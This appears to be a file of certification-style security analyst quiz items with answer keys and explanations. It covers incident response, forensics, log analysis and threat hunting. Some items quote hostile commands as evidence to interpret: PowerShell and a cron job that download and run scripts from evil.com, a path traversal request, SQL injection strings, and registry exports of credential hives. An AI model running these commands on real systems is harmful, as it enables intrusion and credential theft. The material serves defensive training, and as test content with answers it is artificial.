{q:"Which evidence type is MOST volatile and must be collected FIRST during incident response?",o:["Hard drive image", "Network traffic logs", "RAM contents — running processes, network connections, and decrypted data are lost when the system powers off", "Log files"],a:2,d:3,e:"Order of volatility (most to least volatile): CPU registers/cache → RAM → Network state → Running processes → Disk → Removable media. RAM contains the richest volatile evidence: running malware code, decrypted communications, injected shellcode, and live network connections. After reboot or shutdown, this evidence is permanently gone. Capture RAM before anything else in an incident involving suspected malware."},
{q:"Which step MUST occur before eradicating malware from a compromised system?",o:["Restoring from backup", "Documenting and collecting forensic evidence — evidence collection before eradication preserves what the investigation needs", "Notifying law enforcement", "Rebuilding the system"],a:1,d:3,e:"Eradication (removing malware, cleaning systems) destroys evidence. Forensic collection must precede eradication: disk image, memory dump, relevant log files, network captures. If the incident may result in prosecution or litigation, evidence must be forensically sound. Even for non-legal cases, evidence collection captures indicators needed for hunting across other systems and building better detections."},
{q:"A ransomware attack encrypts files on 5 servers. Before restoring from backups, what should the IR team verify?",o:["Nothing — restore immediately", "That the backups are clean (not infected), that the infection vector is identified and closed, and that all attacker persistence mechanisms are removed", "That the ransom demand is legitimate", "That all users are notified"],a:1,d:3,e:"Restoring infected backups re-infects cleaned systems. The infection vector must be closed (patch, credential rotation) or ransomware returns immediately. All persistence must be found and removed or the attacker re-encrypts from their foothold. Verify backup integrity before restore. This verification takes time but prevents the nightmare of re-encryption after a long, expensive recovery."},
{q:"Which phase of incident response involves VERIFYING that a suspected incident actually occurred versus a false positive?",o:["Preparation", "Detection and Analysis — confirming indicators represent a real incident before resource-intensive response", "Containment", "Post-Incident Activity"],a:1,d:3,e:"Detection and Analysis phase: validate that alerts represent a real incident. Many alerts are false positives — verifying before escalating prevents wasted IR effort. Triage involves: corroborating indicators from multiple sources, reviewing context (is this normal for this system?), checking threat intelligence, and applying the incident classification criteria. Only confirmed incidents proceed to full IR."},
{q:"Which legal concept requires organizations to preserve all potentially relevant data when litigation is reasonably anticipated?",o:["Chain of custody", "Legal hold — suspending normal data retention/deletion policies to preserve evidence for potential litigation", "Privacy by design", "Data minimization"],a:1,d:3,e:"Legal hold (litigation hold) requires preserving all potentially relevant electronically stored information (ESI) when litigation is reasonably anticipated — even before a lawsuit is filed. Normal deletion schedules must be suspended. Failure to preserve results in spoliation sanctions. During an incident, if criminal prosecution or civil litigation is possible, legal hold must be implemented immediately across all relevant systems."},
{q:"Which attack uses a previously compromised legitimate website to infect visitors who match a specific target profile?",o:["Phishing", "Watering hole attack — compromising sites frequented by the target population, waiting for targets to visit", "Drive-by download", "Business email compromise"],a:1,d:3,e:"Watering hole attacks compromise websites frequently visited by the target population (e.g., an industry trade association's website visited by aerospace defense employees). The attackers inject malicious code that exploits visitors' browsers. Only targets matching the profile (e.g., specific IP ranges, browser language) are attacked. This bypasses email security and targets even security-aware users who don't click phishing emails."},
{q:"During incident response, a compromised account used to move laterally should have its password changed using which approach?",o:["Change password only", "Disable account, invalidate all sessions and tokens, rotate the password, and enable MFA if not already present — then re-enable when safe", "Ask the user to change their password", "Send a password reset email"],a:1,d:3,e:"Compromised credential containment requires: disable (immediately stop any use), session invalidation (kill active sessions — not just password change, which doesn't terminate existing sessions), password rotation (new credential unknown to attacker), MFA enablement (raise the bar for future compromise). Just changing a password leaves active sessions live and doesn't prevent immediate re-authentication using cached credentials."},
{q:"Which technical control reduces the impact of a successful phishing attack targeting employee credentials?",o:["Security awareness training only", "Phishing-resistant MFA (FIDO2/WebAuthn) — makes credential theft insufficient for account compromise", "Password complexity requirements", "Email filtering alone"],a:1,d:3,e:"Even if credentials are phished, phishing-resistant MFA (FIDO2/hardware keys) prevents account takeover because the second factor is domain-bound — a phishing site can't use it. Traditional MFA (SMS, TOTP) can be bypassed by real-time phishing proxies that relay the OTP. FIDO2 is cryptographically bound to the legitimate domain, making it impossible to use on a phishing site. This is the most effective single control against credential phishing."},
{q:"Which activity during the recovery phase ensures that the restored environment doesn't contain residual attacker access?",o:["Restoring from backup", "Integrity verification — scanning restored systems for malware, comparing file hashes, and verifying configurations before reconnecting", "Updating AV signatures only", "Notifying users"],a:1,d:3,e:"Recovery without verification may re-introduce compromised files or configurations from backups taken during the infection window. Integrity verification: scan with updated AV, compare critical file hashes to known-good baselines, verify system configurations match security baselines, test for attacker persistence mechanisms. Only after verification should systems be reconnected to the production network."},
{q:"Which framework provides detailed guidance specifically for responding to cybersecurity incidents in industrial control systems?",o:["NIST 800-61 only", "ICS-CERT guidelines and NIST 800-82 — OT/ICS-specific guidance addressing safety-critical response considerations", "PCI DSS", "ISO 27001"],a:1,d:3,e:"OT/ICS incident response has unique considerations: physical safety implications of disruption, longer maintenance windows, legacy systems that can't run traditional IR tools, and operational continuity requirements. ICS-CERT provides ICS-specific guidance. NIST 800-82 addresses ICS security. General IR frameworks (800-61) apply but must be adapted for OT/ICS constraints and safety requirements."},
{q:"An analyst notices a scheduled task running 'cmd.exe /c powershell -ep bypass -enc \x3Cbase64\x3E' at 3 AM daily. This MOST likely indicates:",o:["Normal Windows maintenance", "Scheduled task persistence — an attacker installed a scheduled task as a persistence mechanism to maintain access", "Windows Update", "Antivirus scan"],a:1,d:3,e:"Attacker persistence via scheduled tasks: creates a task that runs malicious code at scheduled intervals. The encoded PowerShell (-enc = encoded command) bypasses execution policy (-ep bypass) and hides the actual command. 3 AM timing avoids analyst observation. Scheduled task forensics: examine Task Scheduler event logs (Event ID 4698 = task created), task XML files in C:\\Windows\\System32\\Tasks\\."},
{q:"Which section of a vulnerability management report would MOST help a CISO justify budget for additional remediation resources?",o:["List of CVE numbers", "Risk exposure trend showing increasing unpatched critical vulnerabilities over time — demonstrating growing business risk without additional investment", "Technical patch instructions", "Scan completion statistics"],a:1,d:4,e:"CISOs justify budget by demonstrating risk. A trend showing growing unpatched critical vulnerabilities with financial impact quantification (potential breach cost, regulatory exposure) makes the business case. CVE lists and technical details don't resonate with financial decision-makers. Risk trending shows the consequence of inaction in terms that justify investment."},
{q:"Which metric BEST demonstrates the operational effectiveness of a SOC to executive leadership?",o:["Number of alerts processed per analyst", "MTTD and MTTR trends over time — showing the SOC is detecting and containing threats faster", "Number of security tools deployed", "Security training completion rates"],a:1,d:4,e:"MTTD (Mean Time to Detect) and MTTR (Mean Time to Respond) are outcome metrics that demonstrate actual security effectiveness. Improving trends show the SOC is getting better at its core mission. Volume metrics (alerts processed) measure activity, not outcomes. Executive leaders make resource decisions based on whether the investment is improving actual security posture."},
{q:"A security analyst discovers that a compliance scan shows all controls are passing but a penetration test reveals critical vulnerabilities. This discrepancy should be communicated as:",o:["The compliance scan is sufficient", "Compliance ≠ Security — a critical finding to present to leadership demonstrating that compliance controls are necessary but not sufficient for actual security", "The penetration test is wrong", "Both are valid independently"],a:1,d:4,e:"Compliance scans check whether specific controls are in place; they don't test whether those controls actually work against real attacks. A pentest showing critical vulnerabilities in a 'compliant' environment reveals this gap. This is an important executive communication: meeting compliance requirements is the floor, not the ceiling, of security. It often drives investment in security beyond minimum compliance requirements."},
{q:"Which format is MOST appropriate for communicating a security incident to the board of directors?",o:["Full technical incident report with IOCs and PCAP analysis", "Executive summary: business impact, timeline, data affected, regulatory implications, and remediation actions — without technical jargon", "Detailed forensic analysis report", "Vendor security advisory"],a:1,d:4,e:"Board communications: what happened (in business terms), what data was affected, what the business impact is, what regulatory obligations exist, what actions were taken, and what prevents recurrence. No PCAP analysis, CVE numbers, or technical details. The board needs enough information to fulfill their governance responsibilities and make resource decisions — not enough to rebuild the technical environment."},
{q:"Which communication principle ensures that sensitive incident information is shared appropriately within the organization?",o:["Share everything with everyone for transparency", "Need-to-know distribution — sharing incident details only with stakeholders who require the information to perform their response role", "Publish in the company newsletter", "Encrypt all communications"],a:1,d:4,e:"Incident communications follow need-to-know: technical details to IR team, management summary to affected business unit leaders, legal implications to legal/compliance, regulatory notice to privacy officer, public statement to PR. Over-sharing creates liability (premature disclosure), tipping off attackers, and employee panic. Under-sharing slows response. Structured communication templates with different detail levels for different audiences implement this."},
{q:"An organization's SLA requires critical vulnerability patches within 7 days of discovery. A report shows 40% of critical patches are applied within SLA. This finding should be communicated to:",o:["Only the security team", "Both the security team AND business leadership — SLA breach at this scale indicates systemic process failure requiring management attention and resource allocation", "Only IT operations", "Only the CISO"],a:1,d:4,e:"40% SLA compliance is a systemic failure, not an individual exception. Management must know: the organization faces materially elevated risk from unpatched critical vulnerabilities, the process is failing consistently, and resource or process changes are needed. Keeping this in the security team prevents necessary organizational changes. Leadership visibility drives accountability and resource allocation."},
{q:"Which communication channel is MOST appropriate for notifying affected customers after a confirmed data breach?",o:["Social media announcement first", "Direct customer notification through verified official channels (email from official domain, notification in account portal) following legal counsel guidance on required content and timing", "Press release only", "No notification until investigation is complete"],a:1,d:4,e:"Breach notification requirements (GDPR, CCPA, state laws) specify direct notification to affected individuals through verifiable channels. Social media is insufficient — not everyone follows company accounts. Official email and account portal notifications reach affected users directly. Legal counsel determines: required content (what data, when, what to do), timing (state laws vary: 30-72 hours to 90 days), and which regulators must also be notified."},
{q:"A security team discovers a critical vulnerability in a competitor's product that they use internally. Before patching, the analyst should:",o:["Publicly post the vulnerability on social media", "Coordinate internal patching, notify the vendor through responsible disclosure, and follow internal incident handling procedures if already exploited", "Ignore it since it's the vendor's problem", "Sell the vulnerability information"],a:1,d:4,e:"Internal discovery of a vendor vulnerability: patch internally first (protect the organization), then notify the vendor through responsible disclosure channels. Premature public disclosure harms all users of the product. The vendor needs time to develop and test a patch before broad disclosure. Standard practice: 90-day disclosure deadline (Google Project Zero model), coordinated public disclosure when patch is available."},
{q:"Which type of security report compares the organization's current security posture against the controls required by a specific framework like NIST CSF or ISO 27001?",o:["Penetration test report", "Gap analysis / maturity assessment report — identifying which required controls are missing, partially implemented, or fully implemented", "Incident response report", "Vulnerability scan report"],a:1,d:4,e:"Gap analysis compares current state (what controls exist) against target state (what the framework requires). Each control is assessed: Not Implemented, Partially Implemented, or Fully Implemented. The output is a prioritized roadmap to achieve the target maturity level. This is the foundational document for security program planning and compliance projects."},
{q:"An analyst must report the financial impact of a ransomware incident. Which components should be included?",o:["Only the ransom demand amount", "Total cost including: ransom payment (if paid), incident response costs, business downtime, data recovery, regulatory fines, legal fees, customer notification, and reputation impact", "Only the IR team hours", "Only the cost to restore systems"],a:1,d:4,e:"Total cost of a breach encompasses many components beyond the obvious. Organizations often underestimate true cost by focusing only on immediate recovery. Full cost accounting: IR fees (external firm), forensics, business interruption (revenue lost per day × downtime), ransom (if paid), notification costs, legal fees, regulatory fines, customer churn from reputation damage. This total figure is used for insurance claims, board reporting, and ROI calculations for future security investments."},
{q:"A Sysmon Event ID 3 log shows: ProcessName=mshta.exe, DestinationIP=185.220.x.x (known Tor exit node), DestinationPort=443. What should the analyst investigate FIRST?",o:["Whether mshta.exe needs port 443 access","The script or URL that mshta.exe was given to execute — mshta (HTML Application Host) executing outbound to a Tor exit node indicates a malicious HTA file delivered via phishing or web","Whether Tor is blocked at the firewall","Whether the user was browsing the web"],a:1,d:1,e:"mshta.exe executes HTA (HTML Applications) which can run VBScript/JScript with fewer security restrictions than browsers. Legitimate use is rare in modern environments. Outbound connection to a Tor exit node while running mshta indicates a malicious HTA being used as a delivery/C2 mechanism. The immediate investigation: find how mshta was launched (parent process), what URL/file it was given, and what it did next."},
{q:"An analyst receives an alert for Windows Event ID 4698 (Scheduled Task Created) where the task command is: cmd.exe /c wscript.exe C:\\ProgramData\\update.vbs. This is suspicious because:",o:["Scheduled tasks are inherently malicious","wscript.exe running a .vbs file from ProgramData via a scheduled task is a common persistence technique — legitimate software doesn't typically install scripts in ProgramData via scheduled tasks","All cmd.exe invocations are malicious","wscript.exe is a banned application"],a:1,d:1,e:"Attackers commonly place malicious scripts in writable locations (ProgramData, AppData, Temp) and register scheduled tasks to run them. Legitimate enterprise software installs to Program Files and uses service accounts, not this pattern. Investigate: when was the task created, what account created it, what does update.vbs contain, and what process created the scheduled task."},
{q:"During threat hunting, an analyst queries EDR telemetry for processes with no parent process (PPID=0 or orphaned). This hunting technique aims to detect:",o:["All running processes","Process injection or process hollowing — legitimate processes always have parent processes; orphaned processes may indicate code injected into a new process that was then detached","Slow query performance","Antivirus evasion"],a:1,d:1,e:"Every legitimate Windows process has a parent. Orphaned processes (PPID = 0 or pointing to a non-existent PID) can indicate: injected shellcode spawning a new process that then kills the injector, process hollowing where the original parent exits, or rootkits manipulating process tables. This is a high-value hunting indicator that is difficult to generate via normal activity."},
{q:"A network sensor detects outbound SMTP traffic from a workstation (not a mail server) to an external IP on port 25. This MOST likely indicates:",o:["A user testing email","Malware using SMTP for data exfiltration or spam sending — workstations should never initiate outbound SMTP; all legitimate mail goes through the email gateway","A misconfigured email client","A printer driver update"],a:1,d:1,e:"Workstations should route email through the corporate mail gateway, not directly to external SMTP servers. Direct outbound port 25 from a workstation: malware spreading via email, spam bot activity, or exfiltration via SMTP. Block outbound port 25 from all non-mail servers at the perimeter, and alert on any violations. This is a simple but effective control that generates very high-fidelity alerts."},
{q:"Which Sysmon event ID specifically captures the loading of a DLL into a process, useful for detecting DLL hijacking?",o:["Event ID 1 (Process Create)","Event ID 7 (Image Loaded) — logs the DLL path and hash every time a DLL loads into a process","Event ID 3 (Network Connect)","Event ID 11 (File Create)"],a:1,d:1,e:"Sysmon Event ID 7 (Image Loaded) records: process name, DLL path, SHA256 hash, and whether it is signed. DLL hijacking (T1574) places a malicious DLL where the application will find it first. Event ID 7 alerts when an unsigned or unexpected DLL loads into a sensitive process. High volume — filter to unsigned DLLs loading into critical processes."},
{q:"An analyst reviews proxy logs and sees a workstation making POST requests of exactly 1,337 bytes to an external API every 60 seconds. The User-Agent is 'Mozilla/5.0' but the TLS certificate is self-signed. What is the analyst's assessment?",o:["Normal web API traffic","High confidence C2 — regular interval (beaconing), fixed payload size (consistent data structure), self-signed certificate (attacker-controlled infrastructure), and spoofed User-Agent (evasion attempt)","A misconfigured web application","A bandwidth test"],a:1,d:1,e:"Four indicators compound to very high confidence: (1) 60-second beaconing interval — too regular for human browsing, (2) exactly 1,337 bytes — programmatic fixed payload, (3) self-signed cert — attacker controls the endpoint, (4) Mozilla User-Agent on non-browser process — spoofing. Investigate the process making these requests, its parent, and any files dropped."},
{q:"Which Windows Registry key is MOST commonly used by malware for persistence that executes on every user logon?",o:["HKLM\\SYSTEM\\CurrentControlSet\\Services","HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run — executes contents for the current user on logon","HKLM\\HARDWARE","HKCU\\Software\\Classes"],a:1,d:1,e:"Run keys execute registered programs on logon. HKCU\\...\\Run affects only the current user (writable without admin). HKLM\\...\\Run affects all users (requires admin). Common hunting targets: new or modified values in both. Legitimate software uses these, so baselining known-good entries and alerting on new/changed entries is the detection approach."},
{q:"During an investigation, an analyst finds that PowerShell Script Block Logging Event ID 4104 shows: IEX (New-Object Net.WebClient).DownloadString('http://evil.com/stage2.ps1'). This indicates:",o:["Normal PowerShell administration","Stage 2 malware download using IEX (Invoke-Expression) to download and immediately execute a remote script in memory — a fileless execution technique","A legitimate software update","A PowerShell test script"],a:1,d:1,e:"This is the canonical fileless malware execution pattern: IEX (runs the result as code) + DownloadString (downloads without saving to disk) = remote code executed in memory, no file created. Script Block Logging captures the actual decoded commands despite obfuscation. IEX + web download = immediate investigation priority."},
{q:"An EDR alert fires: explorer.exe accessed lsass.exe with PROCESS_VM_READ access (OpenProcess flags 0x10). This MOST likely indicates:",o:["Normal Windows memory management","Credential dumping — PROCESS_VM_READ on lsass.exe is the API access pattern used by Mimikatz and similar tools to read credential material from LSASS memory","Windows update activity","Antivirus scanning"],a:1,d:1,e:"Mimikatz calls OpenProcess(PROCESS_VM_READ, lsass_pid) then ReadProcessMemory to extract credentials. Sysmon Event ID 10 (ProcessAccess) captures this: TargetImage=lsass.exe, GrantedAccess=0x10. Any process (especially unusual ones like explorer.exe) accessing lsass.exe with read permissions should be treated as credential dumping until proven otherwise."},
{q:"A threat hunter discovers a Windows service with display name 'Windows Security Health Svchost' running from C:\\Users\\Public\\wshs.exe. What makes this suspicious?",o:["The service is running as SYSTEM","Legitimate Windows services run from System32 or Program Files, never from user-writable directories like C:\\Users\\Public. The name mimics a legitimate Windows service — masquerading (T1036)","All custom services are suspicious","The display name is too long"],a:1,d:1,e:"Masquerading (T1036): attackers name malware to resemble legitimate Windows components. Legitimate Windows services run from C:\\Windows\\System32 or C:\\Program Files. C:\\Users\\Public is writable by all users. The combination of a legitimate-sounding name plus a user-writable path = high confidence malicious service persistence."},
{q:"Which technique does an attacker use to make HTTP C2 traffic blend in with legitimate CDN services by routing traffic through trusted infrastructure?",o:["Domain fronting — routing C2 traffic through legitimate CDN infrastructure where the outer domain is legitimate but traffic is forwarded to attacker-controlled backend","HTTPS everywhere","Domain Generation Algorithm","DNS over HTTPS"],a:0,d:1,e:"Domain fronting uses CDN infrastructure: the TLS SNI says cdn.cloudflare.com (legitimate) but the HTTP Host header says attacker.com (malicious). The CDN forwards to the attacker backend. From the firewall perspective, traffic goes to a legitimate CDN IP. This bypasses domain blocklists. Countermeasure: inspect actual HTTP Host headers, not just TLS SNI."},
{q:"Which log source would BEST detect an attacker using 'net use' to map network shares for lateral movement?",o:["Firewall logs","Windows Security Event Log — Event ID 5140 (network share access), 4624 Type 3 (network logon), combined with net.exe command-line in Process Creation logs (4688)","DNS logs","DHCP logs"],a:1,d:1,e:"Net use creates network connections: (1) Event ID 4624 Type 3 on the target system, (2) Event ID 5140 on the target (shared object accessed), (3) Event ID 4688 on the source showing net.exe with arguments. Correlating these across source and destination identifies lateral movement. High-volume net use commands enumerating many shares is particularly suspicious."},
{q:"An analyst sees WMI Event ID 5861 in the Windows event log. This is significant because:",o:["WMI events are always benign","WMI subscriptions are a persistent, stealthy malware mechanism — Event 5861 indicates a WMI event filter or consumer was registered, which is abnormal and warrants immediate investigation","WMI events indicate software updates","WMI is only used by administrators"],a:1,d:1,e:"WMI event subscriptions (T1546.003) are rare in legitimate use but a common attacker persistence mechanism. Any subscription should be investigated: what event filter triggers it, what consumer handles it, and what code it executes. New subscriptions not matching known software should be treated as malicious."},
{q:"During incident triage, an analyst finds C:\\Windows\\Temp\\svch0st.exe (note: zero not letter o). Without executing it, the BEST immediate intelligence-gathering step is:",o:["Delete the file","Calculate the SHA256 hash and query threat intelligence platforms such as VirusTotal or MalwareBazaar — determines if it is known malware without execution risk","Run the file to see what it does","Quarantine only"],a:1,d:1,e:"Hash lookup is the fastest, safest first step for unknown files: hash it, query VirusTotal/MalwareBazaar/CIRCL. If detected by multiple AV engines, you have immediate confirmation and malware family. If not detected (novel malware), proceed to static analysis then dynamic analysis in a sandbox. Never execute potentially malicious files on a production system."},
{q:"An analyst is building a SIEM correlation rule to detect Pass-the-Hash attacks. Which event sequence BEST indicates PtH?",o:["Multiple successful logins","Event 4624 Logon Type 3 using NTLM (not Kerberos) from a non-admin workstation to multiple servers in short succession — especially if the source had no corresponding interactive (Type 2) logon","Any Kerberos logon","Multiple failed logons"],a:1,d:1,e:"Pass-the-Hash signature: (1) Logon Type 3 (network authentication), (2) NTLM authentication — PtH does not work with Kerberos, (3) one source accessing multiple destinations rapidly, (4) no corresponding interactive logon on the source — the user did not actually log in there, their hash was stolen and used remotely. Kerberos-only environments prevent PtH."},
{q:"A web server log shows: GET /index.php?page=../../../../etc/passwd HTTP/1.1 returning a 200 response. This indicates:",o:["A legitimate local request","A successful directory traversal attack — the ../../../../etc/passwd pattern navigated outside the web root and the 200 response means the server returned the file","A failed injection attempt","Normal PHP processing"],a:1,d:1,e:"Directory traversal (T1202): ../../../../ moves up directory levels to escape the web root. /etc/passwd is a classic target confirming successful file disclosure on Linux. HTTP 200 response means the server returned content — the attack succeeded. Immediate response: determine what other files were accessed, whether a web shell was uploaded, and whether the server needs patching."},
{q:"Which type of scan would reveal attack paths through the network that are not visible from individual vulnerability scan results?",o:["Additional vulnerability scans","Attack path analysis / network path simulation — models how an attacker could chain multiple low or medium vulnerabilities to reach high-value targets","Compliance scanning","External port scanning"],a:1,d:2,e:"Individual vulnerability scans rate each finding in isolation. Attack path analysis models the CHAIN: a low-severity vulnerability on a DMZ system plus reachable internal system plus misconfigured admin credential = path to domain controller. Three medium-severity findings together create a critical attack path that individually acceptable scores would miss."},
{q:"An analyst reviews proxy logs and finds an internal host making DNS TXT record queries with 60-character random-looking subdomain strings to a single parent domain at a rate of 30 queries per minute. This is MOST consistent with:",o:["Normal DNS health checks","DNS tunneling — encoding data in DNS query subdomains and TXT responses to establish a covert C2 channel that bypasses firewall rules allowing DNS traffic","CDN health checks","DNSSEC validation traffic"],a:1,d:1,e:"DNS tunneling indicators: long random subdomain labels (data encoded as base64), high query frequency to one parent domain, TXT record usage (arbitrary data payload), and non-browser process generating queries. Tools like dnscat2 and iodine implement DNS tunneling. The attacker's DNS server decodes the data from incoming query subdomains."},
{q:"Which artifact would BEST help an analyst determine the original creation time of a file even if the visible timestamps have been modified by an attacker?",o:["File extension","The $FN (File Name) attribute in the NTFS MFT — attackers can modify $SI (Standard Information) timestamps that users see, but the $FN attribute retains original timestamps","File size","Registry last-write time"],a:1,d:1,e:"Timestomping (T1070.006): attackers modify $SI attribute timestamps (visible to users and standard tools) to make malware appear old. The $FN attribute is modified only by the NTFS system itself — attackers cannot easily change it with standard tools. Comparing $SI and $FN timestamps: if they differ significantly, timestomping occurred. Forensic tools like MFTECmd expose both attributes."},
{q:"Which deception technology places fake credentials in an environment to detect attackers performing credential theft?",o:["Honeypots","Honeytokens / canary tokens — fake credentials that trigger alerts when used. Any authentication attempt with these credentials indicates an attacker found and used them","WAF rules","IDS signatures"],a:1,d:1,e:"Honeytokens (canary credentials) are fake accounts placed in locations attackers harvest from: AD with tempting names, fake AWS keys in code repos, credentials in password managers. Any authentication attempt using canary credentials is high-fidelity — no legitimate user should use them. This enables near-zero false positive detection of credential theft."},
{q:"A SOC alert fires: executable file written to C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\. Why is this a high-priority alert?",o:["Startup folder writes are normal","The Startup folder executes programs automatically for all users on logon — any new executable here is likely persistence malware (T1547.001)","This is the Windows update folder","Only admins write to Startup"],a:1,d:1,e:"Startup folder persistence (T1547.001): files placed in the All Users Startup folder execute for every user who logs in. Legitimate software rarely uses this mechanism — it typically uses services or scheduled tasks. New executables appearing here without corresponding software installations are high-priority: they represent guaranteed execution on every logon."},
{q:"What does a high number of TCP SYN packets with no corresponding SYN-ACK responses in a PCAP indicate?",o:["Normal busy network","SYN scan (port scanning) — sending SYN packets without completing TCP handshakes to map open ports while minimizing detection footprint","Normal data transfer","DDoS attack from outside"],a:1,d:1,e:"TCP SYN scan (Nmap -sS): sends SYN packets, waits for SYN-ACK (port open) or RST (port closed), then sends RST to avoid completing the connection. In a PCAP: many SYN packets across many destination ports from one source with no completed handshakes = port scan. This is typically the reconnaissance phase before exploitation."},
{q:"An analyst is investigating a potentially compromised Linux system. Which file records the command history of the root user's bash sessions?",o:["/var/log/auth.log","/root/.bash_history — records commands entered in the root user's bash sessions","/etc/passwd","/var/log/syslog"],a:1,d:1,e:"~/.bash_history records commands entered in bash. For root: /root/.bash_history. Attackers often clear it (history -c or truncate the file) or set HISTSIZE=0. Absence of bash_history on a system where root has been active is itself suspicious. Additional sources: /var/log/auth.log (sudo commands), auditd logs for comprehensive command auditing."},
{q:"Which network protocol anomaly indicates data exfiltration using ICMP as the transport?",o:["Normal ICMP ping responses","ICMP echo requests with large non-standard payloads containing structured data — ICMP tunneling uses the data field of ping packets to carry exfiltrated data","ICMP time exceeded messages","ICMP destination unreachable messages"],a:1,d:1,e:"ICMP tunneling encodes data in the payload field of ICMP echo request/reply packets. Normal pings have 32-byte payloads; tunneling tools send large, structured payloads. Indicators: large ICMP payload sizes (over 100 bytes), high frequency ICMP to a single external destination, data patterns in payloads. Tools like ptunnel implement ICMP tunneling."},
{q:"An analyst notices an executable has its CREATED timestamp showing 2019, but the NTFS $MFT entry shows it was written to disk last week. This is called:",o:["Normal file behavior","Timestomping — the attacker modified the file's standard information timestamps to appear older, a defense evasion technique (T1070.006)","A Windows bug","File system corruption"],a:1,d:1,e:"Timestomping (T1070.006): modifying file timestamps to evade forensic detection by making malware appear to be old, legitimate software. Attackers change $SI (Standard Information) timestamps visible to users, while $FN (File Name) attribute retains original times. MFT forensics comparing $SI and $FN timestamps reveals the discrepancy."},
{q:"Which Windows Event ID indicates a user account was added to the Domain Admins group?",o:["4624","4728 (member added to a global security group) — Domain Admins is a global security group; this event fires when any member is added to it","4648","4720"],a:1,d:1,e:"Group membership changes are high-value events. 4728 = member added to a global security group (Domain Admins is global). 4732 = member added to a local security group. Alert immediately on additions to Domain Admins, Enterprise Admins, Schema Admins, and local Administrators. Any unexpected privileged group addition indicates either insider threat or attacker privilege escalation."},
{q:"A web application firewall log shows 200 requests in 1 minute from the same IP, all with variations of SQL injection payloads: '1 OR 1=1', '1%27 OR %271%27%3D%271'. This indicates:",o:["Normal web traffic","Automated SQL injection probing — testing multiple encoding and quoting variations to find a WAF bypass","API rate limiting","Normal form submission"],a:1,d:2,e:"Automated SQL injection testing: a tool like sqlmap is trying URL-encoded, string-concatenated, and other obfuscated payload variations to find one the WAF does not filter. The 200/minute rate indicates automated tooling. The WAF is blocking most attempts. Investigate whether any payloads reached the application backend and whether any returned database content."},
{q:"Which user behavior would UEBA MOST reliably flag as anomalous compared to an established baseline?",o:["A user reading email","A user downloading 10GB of files at 2 AM on a Saturday after only ever downloading small files during business hours — statistical deviation from their established baseline","An admin running scripts","A user changing their password"],a:1,d:1,e:"UEBA detects statistical anomalies against individual baselines. Time (2 AM Saturday vs. normal business hours), volume (10GB vs. small files), and day (weekend vs. weekdays) all deviate from this user's established pattern. UEBA systems score the deviation probability and alert when it crosses a threshold. This is a classic insider threat or compromised account pattern."},
{q:"An analyst finds a cron job on a Linux system: '* * * * * root curl http://evil.com/cmd.sh | bash'. The five asterisks mean this runs:",o:["Once a day","Every minute — five asterisks in cron (minute, hour, day, month, weekday) each set to * means every possible value — this malicious job downloads and executes a script every single minute","Once a week","Only on root login"],a:1,d:1,e:"Cron syntax: minute hour day-of-month month day-of-week. All asterisks = every minute of every hour of every day. 'curl ... | bash' downloads a script and pipes it directly to bash — a fileless execution technique on Linux. Response: identify when the cron job was added, remove it, investigate what cmd.sh contains, and check for other persistence mechanisms."},
{q:"Which command shows active outbound network connections and their associated process names on a Windows system?",o:["dir","netstat -anob — shows active connections, listening ports, process IDs, and executable names for each connection","ipconfig /all","tasklist"],a:1,d:1,e:"netstat -anob output: '-a' shows all connections and listening ports, '-n' shows numerical IPs without DNS resolution, '-o' shows the owning process ID, '-b' shows the executable name. This immediately shows which processes are connected to external IPs, enabling rapid identification of suspicious C2 connections. Run quickly — attacker connections may be intermittent."},
{q:"An analyst finds reg save commands were used to export HKLM\\SAM and HKLM\\SYSTEM to C:\\Temp. What is the attacker's goal?",o:["Backing up the registry for recovery","Credential dumping — the SAM database contains local account NTLM hashes, and the SYSTEM hive contains the boot key needed to decrypt them. Together they enable offline extraction of all local account hashes","System recovery preparation","Software license backup"],a:1,d:1,e:"The SAM database stores NTLM hashes of local accounts encrypted with the SYSKEY/boot key stored in the SYSTEM hive. Exfiltrating both enables offline hash extraction using tools like Impacket secretsdump.py. This technique avoids touching lsass.exe (heavily monitored) and achieves the same result. Detection: Event ID 4663 (object access to SAM), registry export audit events."},
{q:"A threat hunter is looking for evidence of Kerberoasting. Which data source and indicator combination is MOST relevant?",o:["Firewall logs showing unusual traffic","Windows Security Event ID 4769 with encryption type 0x17 (RC4) for privileged service accounts — Kerberoasting requests service tickets with weaker encryption for faster offline cracking","DHCP lease logs","DNS query logs"],a:1,d:1,e:"Kerberoasting (T1558.003): requests Kerberos Service Tickets for service accounts, then cracks them offline. Event 4769 shows which service account ticket was requested and the encryption type. Encryption type 0x17 (RC4-HMAC) is requested by attackers because it cracks faster than AES. Alert on 4769 with 0x17 encryption for privileged service accounts, especially in environments where AES is enforced by default."},
{q:"Which MITRE ATT&CK tactic describes an attacker maintaining access to a compromised environment through reboots and credential changes?",o:["Initial Access (TA0001)","Persistence (TA0003) — techniques ensuring continued access including registry run keys, scheduled tasks, services, WMI subscriptions, and account manipulation","Privilege Escalation (TA0004)","Discovery (TA0007)"],a:1,d:1,e:"ATT&CK Persistence (TA0003) includes: Registry Run Keys/Startup Folder, Scheduled Tasks/Jobs, Create or Modify System Process (services), Boot or Logon Autostart Execution, Event-Triggered Execution (WMI subscriptions), and Account Manipulation. After initial compromise, establishing multiple persistence mechanisms is one of the attacker's first priorities — hunting for new persistence is a high-value detection activity."},
{q:"During a network investigation, Zeek conn.log shows a connection from an internal workstation lasting 7,200 seconds with only 1,200 bytes transferred. This is MOST consistent with:",o:["Normal file transfer","Long-duration low-bandwidth C2 session — a persistent connection maintaining interactive access with minimal data transfer, consistent with command polling rather than data exfiltration","Normal web browsing session","Video streaming traffic"],a:1,d:1,e:"C2 session characteristics: long duration (maintained connection), low data volume (commands are small text), regular or infrequent communication. This 2-hour, 1.2KB session is an attacker maintaining a persistent interactive shell — just enough traffic to keep the connection alive. Compare: web sessions last seconds, file transfers are high-bandwidth bursts, streaming is sustained high-bandwidth."},
